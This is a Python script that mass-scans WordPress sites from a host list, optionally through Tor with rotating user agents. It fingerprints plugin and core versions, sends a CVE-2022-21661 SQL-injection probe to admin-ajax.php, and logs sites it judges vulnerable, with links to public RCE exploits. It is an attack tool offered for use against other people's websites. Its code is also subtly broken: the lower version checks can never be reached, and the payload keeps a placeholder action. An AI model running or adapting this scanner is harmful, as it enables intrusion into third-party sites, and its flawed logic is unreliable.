import re
import random
import urllib3
import argparse
import requests
from urllib3 import Timeout, Retry
from urllib3.contrib.socks import SOCKSProxyManager
from multiprocessing import Pool, freeze_support

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("-v", "--verbose", help="verbose", action="store_true")
parser.add_argument("-t", "--threads", help="number of threads (5)", type=int, default=10)
parser.add_argument("-u", "--url", help="https://site.com", type=str)

args = parser.parse_args()

ua = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
      'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)']


def header_gen(tor=None):
    header = {
        'User-agent': random.choice(ua),
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive'}

    try:
        if tor:
            http = SOCKSProxyManager("socks5h://127.0.0.1:9050", headers=header, cert_reqs=False, num_pools=30)
        else:
            http = urllib3.PoolManager(headers=header, cert_reqs=False, num_pools=30)
    except Exception as ex:
        print(str(ex))
        http = urllib3.PoolManager(headers=header, cert_reqs=False, num_pools=30)
    return http


def cve_2022_21661(url):
    try:
        burp0_url = url + "/wp-admin/admin-ajax.php"
        burp0_headers = {"Upgrade-Insecure_Requests": "1",
                         "User-Agent": random.choice(ua),
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.99",
                         "Sec-Fetch-Dest": "document",
                         "Sec-Fetch-Mode": "navigate",
                         "Sec-Fetch-Site": "cross-site",
                         "Cache-Control": "max-age=0",
                         "Connection": "close ",
                         "Content-Type": "application/x-www-form-urlencoded"}
        burp0_data = {"action": "<action_name>",
                      "nonce": "a85a0c3bfa",
                      "query_vars": "{\"tax_query\":[{\"field\":\"term_taxonomy_id\",\"terms\":[\"<INJECT>\"]}]}"}
        req = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        if "database error" in req.text:
            if args.verbose:
                print(f"CVE-2022-21661 on {url}")
            f = open("wp_vuln.txt", "a", encoding="utf-8")
            f.write(f"{url} CVE-2022-21661_WP_Core_SQLi\n")
            f.close()
    except Exception as ex:
        if "Failed to parse" in str(ex) or "Max retries exceeded" in str(ex) or "Failed to establish a new connection" in str(ex) or "SSL" in str(ex) or "No host specified." in str(ex):
            pass
        else:
            print(str(ex))


def cve_by_wp_version(url, version):
    if float(version) <= 5.83:
        cve_2022_21661(url)
    elif float(version) <= 5.0:
        f = open("wp_vuln.txt", "a", encoding="utf-8")
        f.write(f"{url} WP_Core_5.0_RCE_https://www.exploit-db.com/exploits/46511\n")
        f.close()
    elif float(version) <= 4.6:
        f = open("wp_vuln.txt", "a", encoding="utf-8")
        f.write(f"{url} WP_Core_4.6_RCE_https://www.exploit-db.com/exploits/41962\n")
        f.close()


def wp_vuln(url):
    # WP version
    if "http" not in url:
        url = "https://" + url
    print(f"Processing {url}...")

    # Check for known high risk vulns
    for p in vuln_plugins:
        try:
            plugins_req = header_gen().request("GET", url + p.split("|")[0], retries=Retry(2), timeout=Timeout(30))
            if plugins_req.status == 200:
                versions = p.split("|")[1].split(",")
                if "-" in versions[0]:
                    if versions[0].split("-")[0] in plugins_req.data.decode("utf-8", "ignore") and versions[0].split("-")[1] not in plugins_req.data.decode("utf-8", "ignore") and versions[1] in plugins_req.data.decode("utf-8", "ignore"):
                        if args.verbose:
                            print(f"{url}{p.split('|')[0]} {p.split('|')[2]}\n")
                        f = open("wp_vuln.txt", "a", encoding="utf-8")
                        f.write(f"{url}{p.split('|')[0]} {p.split('|')[2]}\n")
                        f.close()

                else:
                    if p.split("|")[1].split("+")[1].split(",")[0] in plugins_req.data.decode("utf-8", "ignore") and p.split("|")[1].split(",")[1] in plugins_req.data.decode("utf-8", "ignore"):
                        if args.verbose:
                            print(p.split("|")[2])
                        f = open("wp_vuln.txt", "a", encoding="utf-8")
                        f.write(f"{url}{p.split('|')[0]} {p.split('|')[2]}\n")
                        f.close()

        except Exception as ex:
            if "Failed to parse" in str(ex) or "Max retries exceeded" in str(ex) or "Failed to establish a new connection" in str(ex) or "SSL" in str(ex) or "No host specified." in str(ex):
                pass
            else:
                print(f"\nURL: {url}\nException: {str(ex)}")

    try:
        main_page = header_gen().request("GET", url, retries=Retry(2), timeout=Timeout(30))
        if main_page.status == 200:
            version1 = re.findall('name="generator" content="(.+?)"', main_page.data.decode("utf-8", "ignore"))
            if version1 and len(version1[0]) < 20:
                if args.verbose:
                    print(f"\nVersion from generator {version1[0]}")
                # Check WP Core vulns
                cve_by_wp_version(url, f"{str(version1[0]).split(' ')[1].split('.')[0]}.{''.join(str(version1[0]).split(' ')[1].split('.')[1:])}")

            version2 = re.findall(r'style.min.css.ver.(\d.{4})', main_page.data.decode("utf-8", "ignore"))
            if version2:
                if "'" in version2[0]:
                    version2 = re.findall(r'style.min.css.ver.(\d.{2})', main_page.data.decode("utf-8", "ignore"))
                if args.verbose:
                    print(f"\nVersion from style.css {version2[0]}")
                # Check WP Core vulns
                cve_by_wp_version(url, f"{str(version2[0]).split('.')[0]}.{''.join(str(version2[0]).split('.')[1:])}")

    except Exception as ex:
        if "Failed to parse" in str(ex) or "Max retries exceeded" in str(ex) or "Failed to establish a new connection" in str(ex) or "SSL" in str(ex) or "No host specified." in str(ex):
            pass
        else:
            print(f"\nURL: {url}\nException: {str(ex)}")


if __name__ == "__main__":
    vuln_plugins = [p.split("\n")[0] for p in open("plugins.txt", "r", encoding="utf-8").readlines()]
    print("Starting...")
    if args.url:
        wp_vuln(args.url)
    else:
        hosts = [h.split("\n")[0] for h in open("wp_hosts.txt", "r", encoding="utf-8").readlines()]
        freeze_support()
        pool = Pool(args.threads)
        pool.map(wp_vuln, hosts)
        pool.close()
        pool.join()
